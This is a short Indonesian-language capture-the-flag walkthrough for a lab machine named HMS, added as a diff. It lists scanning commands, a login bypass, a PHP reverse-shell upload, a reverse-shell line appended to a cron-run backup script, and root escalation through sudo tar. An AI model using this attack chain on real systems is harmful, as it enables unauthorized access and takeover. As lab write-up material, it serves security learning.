@@ -1,0 +1,32 @@
+Walkthrough HMS 
+
+1. kita cek ip dahulu dengan netdiscover
+'netdiscover -i ens33 -r 192.168.0.0/24'
+didapat ip 192.168.0.92
+2. setelah itu kita cek port nya yang terbuka 
+'nmap -v -T4 -A -p- -oN nmap.log 10.0.2.70 '
+dan didapat port 21,22,7080.
+3. pertama saya cek port 21 yakni ftp dan tidak ada apa-apa 
+4. Selanjutnya saya cek web di port 7080 dan karena login page saya berpikir sql injection dan karena harus pakai type email jadi saya ubah aja di inspect type emailnya ganti jadi text selesai
+5. Setelah login seperti biasa saya cek source codenya ternyata ada site yang dikomentar yaitu setting.php akhirnya saya cek ada form upload image jadi saya gunakan untuk upload revshell.php dan di terminal saya 'nc -lvnp portnya' 
+
+6. dan setelah dapat shell nya saya cek di home ada dua user eren dan nivek. pertama saya cek eren ternyata tidak bisa lalu saya cek nivek dan dapat user flag.
+
+7. selanjutnya adalah mendapatkan shell root. awalnya saya bingung karena saya sudo -l memerlukan password jadi saya cek yang memungkinkan ada vulnerabiliitynya menggunakan command find.
+'find / -type f -perm 4000 -exec ls -al {} \; 2>/dev/null'
+
+8. dan ada /usr/bin/bash -p dan didapatlah bash yang juga usernya eren jadi sekarang kita bisa cek /home/eren ada dua file backup dan backup.sh jadi kemungkinan file ini dijalankan jadi saya cek /etc/crontab dan benar file ini dijalankan setiap 5 menit.
+
+9. akhirnya saya tambahkan command berikut :
+'echo "bash -i >& /dev/tcp/192.168.0.12/9090 0>&1" >> backup.sh
+
+10. dan di terminal satu lagi saya ketik command berikut:
+'nc -lvp 9090' dan tunggu 5 menit
+
+11. setelah dapat shell nya kita pakai command berikut :
+'sudo -l ' dan ada /usr/bin/tar yang bisa kita jalankan pakai sudo.
+
+12. jadi saya cari di gtfobins dan menggunakan command beriikut untuk dapat hak akses root:
+'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
+
+13. AND BOOM dapat lah hak akses root dan cd /root dan ada flag root
